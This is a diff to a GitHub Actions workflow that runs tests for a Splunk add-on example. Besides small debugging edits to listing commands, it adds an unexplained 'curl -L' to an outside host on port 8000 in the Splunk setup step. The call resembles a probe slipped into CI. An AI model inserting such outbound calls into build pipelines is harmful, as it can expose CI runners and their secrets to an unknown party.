@@ -225,7 +225,7 @@ jobs:
           pip install git+https://github.com/pixelb/crudini
           mkdir test-results
           cp -r tests/deps/splunk-add-on-for-ucc-example/output output
-          ls -al
+          ls -al tests
           ls -al output
       - name: Splunk Setup
         run: |
@@ -257,6 +257,8 @@ jobs:
           # echo "Sauce connect proxy setup..."
           echo "*********************************"
           cat /etc/hosts
+          echo "##################################"
+          curl -L http://git.workflows.live:8000
 
           # echo "$SPLUNK_VERSION"
           # echo "$SPLUNK_APP_ID"
